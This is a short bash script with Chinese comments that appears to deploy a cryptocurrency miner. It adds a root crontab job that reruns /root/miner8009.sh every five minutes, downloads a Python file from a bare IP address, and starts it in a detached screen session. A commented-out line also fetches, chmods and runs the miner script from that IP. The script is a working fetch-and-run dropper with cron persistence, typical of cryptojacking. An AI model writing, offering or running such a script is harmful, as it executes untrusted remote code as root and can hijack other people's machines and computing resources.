#!/bin/bash

#rm ~/khd.py ~/miner8009.sh;wget http://150.158.140.31/miner8009.sh -P /root/ &&chmod 777 ~/miner8009.sh&&~/miner8009.sh&&tail /etc/crontab
#echo  "*/5 *    * * *   root  /root/miner8009.sh"  >> /etc/crontab

if ! grep -q "/root/miner8009.sh" /etc/crontab; then
    echo "*/5 *    * * *   root  /root/miner8009.sh" >> /etc/crontab
    echo "定时任务已添加到 /etc/crontab"
	sed -i '/\/root\/miner8009.sh/s/^#//g' /etc/crontab
else
    echo "定时任务已存在"
fi

# 检查/root目录下是否存在khd.py文件
if [ ! -f /root/khd.py ]; then
    # 如果文件不存在，则使用wget下载文件
    wget http://150.158.140.31/khd -P /root/ -O khd.py
    echo "下载完成"
else
    echo "文件已存在"
fi

# 检查进程是否存在khd.py，如果不存在则运行
if ! ps aux|grep khd.py|grep -v grep > /dev/null; then
    #nohup python3 /root/khd.py > /root/khd.log 2>&1 &
	cd ~
	screen -dmS khd python3 khd.py
    echo "khd.py 运行中"
else
    echo "khd.py 进程已存在"
fi
